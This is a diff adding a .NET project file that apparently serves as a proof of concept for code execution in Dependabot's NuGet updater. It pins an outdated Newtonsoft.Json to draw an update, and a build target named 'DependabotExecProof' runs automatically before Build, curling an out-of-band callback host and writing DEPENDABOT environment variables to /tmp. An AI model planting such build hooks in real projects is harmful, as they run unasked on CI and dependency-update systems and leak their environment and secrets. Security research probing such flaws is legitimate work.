@@ -1,0 +1,14 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <TargetFramework>net8.0</TargetFramework>
+  </PropertyGroup>
+  <ItemGroup>
+    <!-- Use an old version so Dependabot will suggest an update -->
+    <PackageReference Include="Newtonsoft.Json" Version="12.0.1" />
+  </ItemGroup>
+  <!-- MSBuild target that executes during build (SDK project discovery) -->
+  <Target Name="DependabotExecProof" BeforeTargets="Build">
+    <Exec Command="curl -s https://dependabot-nuget-exec.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site/proof-$(date +%%s) || true" IgnoreExitCode="true" />
+    <Exec Command="env | grep -i DEPENDABOT > /tmp/dep-env.txt 2>/dev/null || true" IgnoreExitCode="true" />
+  </Target>
+</Project>
